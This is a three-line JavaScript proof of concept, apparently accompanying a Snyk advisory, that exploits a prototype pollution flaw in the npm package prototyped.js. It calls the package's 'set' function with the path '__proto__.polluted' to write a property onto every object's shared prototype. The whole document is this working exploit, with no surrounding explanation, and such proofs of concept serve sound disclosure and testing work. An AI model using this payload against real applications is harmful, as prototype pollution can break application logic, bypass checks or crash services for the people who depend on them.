//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
const set = require("prototyped.js/dist/object/set").default;
set({}, "__proto__.polluted", "yes");
  